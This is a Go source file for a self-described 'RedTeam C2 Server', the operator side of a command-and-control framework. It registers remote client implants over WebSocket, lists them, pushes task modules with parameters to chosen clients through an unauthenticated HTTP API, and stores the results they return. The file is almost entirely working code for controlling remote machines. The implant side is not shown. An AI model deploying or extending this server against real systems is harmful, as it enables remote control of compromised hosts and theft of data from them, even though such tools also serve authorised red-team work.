package main

import (
	"encoding/json"
	"html/template"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

type Client struct {
	ID     string                 `json:"id"`
	Info   map[string]string      `json:"info"`
	Conn   *websocket.Conn
	sync.Mutex
}

var (
	clients   = make(map[string]*Client)
	clientsMu sync.Mutex
	taskLog   []map[string]interface{}
	logMu     sync.Mutex
)

func main() {
	// Web UI
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		tmpl := template.Must(template.ParseFiles("templates/index.html"))
		tmpl.Execute(w, nil)
	})
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// WebSocket for clients
	http.HandleFunc("/ws", handleClientWS)

	// API endpoints
	http.HandleFunc("/api/clients", handleGetClients)
	http.HandleFunc("/api/task", handleTask)
	http.HandleFunc("/api/logs", handleGetLogs)

	log.Println("🚀 RedTeam C2 Server listening on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func handleClientWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Upgrade error:", err)
		return
	}
	defer conn.Close()

	var regMsg struct {
		Type string            `json:"type"`
		ID   string            `json:"id"`
		Info map[string]string `json:"info"`
	}
	if err := conn.ReadJSON(&regMsg); err != nil || regMsg.Type != "register" {
		log.Println("Invalid registration")
		return
	}

	client := &Client{
		ID:   regMsg.ID,
		Info: regMsg.Info,
		Conn: conn,
	}
	clientsMu.Lock()
	clients[client.ID] = client
	clientsMu.Unlock()
	log.Printf("✅ Client %s registered: %v", client.ID, client.Info)

	for {
		var msg map[string]interface{}
		if err := conn.ReadJSON(&msg); err != nil {
			clientsMu.Lock()
			delete(clients, client.ID)
			clientsMu.Unlock()
			log.Printf("❌ Client %s disconnected", client.ID)
			break
		}
		// Store result
		logMu.Lock()
		taskLog = append(taskLog, msg)
		logMu.Unlock()
		log.Printf("📥 Result from %s: %v", client.ID, msg)
	}
}

func handleGetClients(w http.ResponseWriter, r *http.Request) {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	list := []map[string]interface{}{}
	for id, c := range clients {
		list = append(list, map[string]interface{}{
			"id":   id,
			"info": c.Info,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

func handleGetLogs(w http.ResponseWriter, r *http.Request) {
	logMu.Lock()
	defer logMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(taskLog)
}

func handleTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}
	var req struct {
		ClientID string                 `json:"client_id"`
		Module   string                 `json:"module"`
		Params   map[string]interface{} `json:"params"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	clientsMu.Lock()
	client, ok := clients[req.ClientID]
	clientsMu.Unlock()
	if !ok {
		http.Error(w, "Client offline", 404)
		return
	}

	task := map[string]interface{}{
		"id":     time.Now().UnixNano(),
		"module": req.Module,
		"params": req.Params,
	}

	client.Lock()
	defer client.Unlock()
	if err := client.Conn.WriteJSON(task); err != nil {
		http.Error(w, "Send failed", 500)
		return
	}
	w.WriteHeader(http.StatusOK)
}